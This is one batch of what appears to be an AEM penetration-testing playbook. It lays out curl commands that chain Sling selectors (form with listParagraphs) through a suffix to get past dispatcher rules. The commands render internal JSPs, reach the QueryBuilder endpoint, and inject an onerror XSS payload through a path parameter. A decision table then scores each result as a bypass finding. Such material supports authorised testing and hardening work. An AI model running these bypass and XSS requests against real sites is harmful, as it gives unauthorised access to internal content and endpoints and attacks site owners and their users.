# Batch 11 — Chain selectors (`form` → `listParagraphs`)

## objective

Combine **two** gadgets: outer `form` (suffix forward / extension camouflage) + inner `listParagraphs` (internal render).  
Stay on selector chaining only — no Forms product, no package mining.

## estimated_time

45–75 minutes

## prerequisites

- Batch 06 and/or 10 attempted
- `PAGE` known

## testing_workflow

### 1) Technique A — form wraps listParagraphs (about.jsp)

```bash
T="https://TARGET"
PAGE="/content/YOUR/PAGE"

# Outer path uses form + harmless ext; suffix is the listParagraphs URL
curl -sk -o /tmp/ch.html -w "%{http_code} %{size_download}\n" \
  "$T${PAGE}.form.js${PAGE}.listParagraphs.html?itemResourceType=/libs/granite/ui/components/shell/help/about/about.jsp&limit=1"
head -c 500 /tmp/ch.html; echo
```

### 2) Technique B — same chain with XSS path param

```bash
curl -sk -o /tmp/ch.html -w "%{http_code}\n" \
  "$T${PAGE}.form.js${PAGE}.listParagraphs.html?itemResourceType=/libs/cq/statistics/components/queries-by-result/html.jsp&limit=1&path=%3Cimg%20src=x%20onerror=alert(1)%3E"
grep -i onerror /tmp/ch.html | head
```

### 3) Technique C — form → QueryBuilder suffix (confirm still works under chain mindset)

```bash
curl -sk -o /tmp/ch.json -w "%{http_code} %{size_download}\n" \
  "$T${PAGE}.form.css/bin/querybuilder.json?path=/content&p.limit=2"
head -c 300 /tmp/ch.json; echo
```

If 06 already proved this, treat as 10-minute confirmation only.

## decision_points

| If… | Then… |
|-----|--------|
| Chain bypasses a block that 10 hit alone | High-value finding — write up clearly |
| Nothing new | Close selector track; go **12** or **15** |
| form dead, listParagraphs alive | No more time on chains |

## expected_findings

- Multi-layer dispatcher bypass + XSS/internal access

## next_batch_to_continue_with

→ **[12-forms-surface.md](./12-forms-surface.md)** if Forms possible  
else → **[15-modern-ssrf-xxe.md](./15-modern-ssrf-xxe.md)**
